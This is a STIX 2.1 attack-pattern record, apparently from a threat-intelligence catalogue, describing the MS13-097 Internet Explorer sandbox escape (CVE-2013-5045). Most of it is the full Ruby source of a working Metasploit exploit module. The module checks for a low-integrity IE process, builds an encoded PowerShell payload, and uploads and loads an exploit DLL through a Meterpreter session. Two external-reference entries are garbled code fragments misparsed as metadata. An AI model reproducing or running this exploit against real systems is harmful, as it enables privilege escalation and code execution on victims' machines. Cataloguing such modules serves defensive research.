{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c3a7cf4-a07a-4052-8da1-17cc564f9b44",
    "created": "2024-08-14T16:49:59.454742Z",
    "modified": "2024-08-14T16:49:59.454746Z",
    "name": "MS13-097 Registry Symlink IE Sandbox Escape",
    "description": " This module exploits a vulnerability in Internet Explorer Sandbox which allows to escape the Enhanced Protected Mode and execute code with Medium Integrity. The vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll component, which can be abused to force medium integrity IE to user influenced keys. By using registry symlinks it's possible force IE to add a policy entry in the registry and finally bypass Enhanced Protected Mode.  'License'\t=> MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms13_097_ie_registry_symlink.rb",
            "external_id": "ms13_097_ie_registry_symlink.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-5045"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/tyranid/IE11SandboxEscapes"
        },
        {
            "source_name": "session.railgun.kernel32.SetEnvironmentVariableA(\"HTML_URL\"",
            "external_id": "nil)"
        },
        {
            "source_name": "session.railgun.kernel32.SetEnvironmentVariableA(\"HTML_URL\"",
            "external_id": "html_uri)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS13-097 Registry Symlink IE Sandbox Escape',\n        'Description'\t=> %q{\n          This module exploits a vulnerability in Internet Explorer Sandbox which allows to\n          escape the Enhanced Protected Mode and execute code with Medium Integrity. The\n          vulnerability exists in the IESetProtectedModeRegKeyOnly function from the ieframe.dll\n          component, which can be abused to force medium integrity IE to user influenced keys.\n          By using registry symlinks it's possible force IE to add a policy entry in the registry\n          and finally bypass Enhanced Protected Mode.\n        },\n        'License'\t=> MSF_LICENSE,\n        'Author' => [\n          'James Forshaw', # Vulnerability Discovery and original exploit code\n          'juan vazquez' # metasploit module\n        ],\n        'Platform'\t=> [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Stance' => Msf::Exploit::Stance::Aggressive,\n        'Targets' => [\n          [ 'IE 8 - 11', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2013-12-10',\n        'References' => [\n          ['CVE', '2013-5045'],\n          ['MSB', 'MS13-097'],\n          ['BID', '64115'],\n          ['URL', 'https://github.com/tyranid/IE11SandboxEscapes']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_loadlib\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('DELAY', [true, 'Time that the HTTP Server will wait for the payload request', 10])\n      ]\n    )\n  end\n\n  def exploit\n    print_status(\"Running module against #{sysinfo['Computer']}\") unless sysinfo.nil?\n\n    mod_handle = session.railgun.kernel32.GetModuleHandleA('iexplore.exe')\n    if mod_handle['return'] == 0\n      fail_with(Failure::NotVulnerable, \"Not running inside an Internet Explorer process\")\n    end\n\n    unless get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NotVulnerable, \"Not running at Low Integrity\")\n    end\n\n    begin\n      Timeout.timeout(datastore['DELAY']) { super }\n    rescue Timeout::Error\n    end\n\n    session.railgun.kernel32.SetEnvironmentVariableA(\"PSH_CMD\", nil)\n    session.railgun.kernel32.SetEnvironmentVariableA(\"HTML_URL\", nil)\n  end\n\n  def primer\n    cmd = cmd_psh_payload(payload.encoded,\n                          payload_instance.arch.first,\n                          {\n                            :remove_comspec => true\n                          })\n\n    cmd.gsub!('powershell.exe ', '')\n    session.railgun.kernel32.SetEnvironmentVariableA(\"PSH_CMD\", cmd)\n\n    html_uri = \"#{get_uri}/#{rand_text_alpha(4 + rand(4))}.html\"\n    session.railgun.kernel32.SetEnvironmentVariableA(\"HTML_URL\", html_uri)\n\n    temp = get_env('TEMP')\n\n    print_status(\"Loading Exploit Library...\")\n\n    session.core.load_library(\n      'LibraryFilePath' => ::File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2013-5045\", \"CVE-2013-5045.dll\"),\n      'TargetFilePath' => temp + \"\\\\CVE-2013-5045.dll\",\n      'UploadLibrary' => true,\n      'Extension' => false,\n      'SaveToDisk' => false\n    )\n  end\n\n  def on_request_uri(cli, request)\n    if request.uri =~ /\\.html$/\n      print_status(\"Sending window close html...\")\n      close_html = <<~eos\n        <html>\n        <body>\n        <script>\n        window.open('', '_self', '');\n        window.close();\n        </script>\n        </body>\n        </html>\n      eos\n      send_response(cli, close_html, { 'Content-Type' => 'text/html' })\n    else\n      send_not_found(cli)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-12-10",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}